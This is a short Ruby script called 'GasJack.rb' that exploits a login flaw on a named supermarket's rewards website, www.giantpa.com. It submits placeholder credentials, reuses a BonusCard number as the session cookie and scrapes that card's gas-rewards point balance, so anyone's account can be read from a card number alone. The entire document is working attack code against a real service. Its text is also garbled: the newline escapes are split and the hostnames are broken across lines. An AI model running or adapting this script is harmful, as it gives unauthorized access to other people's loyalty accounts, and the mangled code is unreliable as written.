GasJack.rb
require 'socket'
def betweenstrings(searchtext,startstring,endstring,startindex)
searchtextlength = searchtext.length
startstringlength = startstring.length
endstringlength = endstring.length
if searchtextlength == 0 or startstringlength == 0 or endstringlength == 0
return ""
else
if searchtextlength - (startstringlength + endstringlength) <= 0
return ""
else
startstringindex = searchtext.index(startstring,startindex)
if startstringindex == nil then
return ""
else
endstringindex = searchtext.index(endstring,startstringindex + startstringlength)
if endstringindex == nil
return ""
else
betweenstringslength = endstringindex - (startstringindex + startstringlength)
return searchtext[startstringindex + startstringlength,betweenstringslength]
end
end
end
end
end
puts "Enter 11 digit BonusCard number"
bcn = gets
sck = TCPSocket.new('www.giantpa.com', 'www')
post_string = "POST /shareddev/Giant_register/login_action.html HTTP/1.1\ nContent-Type:
application/x-www-form-urlencoded\ nHost: www.giantpa.com\
nContent-Length: 63\ nCookie: JSESSIONID="+bcn+"\ n\ n"+"F_
Username=a&F_Password=a&F_BonusCard="+bcn+"&Login=Sign+In\ n"
sck.print post_string
answer_post = sck.gets(nil)
sck.close
location302 = betweenstrings(answer_post,"location: http://www.giantpa.com","\ n",0)
location302.chop!
get302_string = "GET "+location302+" HTTP/1.1\ nHost: www.
giantpa.com\ nCookie: JSESSIONID="+bcn+"\ n\ n"
sck = TCPSocket.new('www.giantpa.com', 'www')
sck.print get302_string
answer_get302 = sck.gets(nil)
sck.close
sck = TCPSocket.new('www.giantpa.com', 'www')
getpoints_string = "GET /shareddev/subclub/ HTTP/1.1\ nHost: www.
giantpa.com\ nCookie: JSESSIONID="+bcn+"\ n\ n"
sck.print getpoints_string
answer_getpoints = sck.gets(nil)
sck.close
gaspoints = answer_getpoints[/You have \ d* Gas Extra Rewards points/]
gaspoints = betweenstrings(gaspoints,"You have "," Gas Extra Rewards points",0)
puts gaspoints

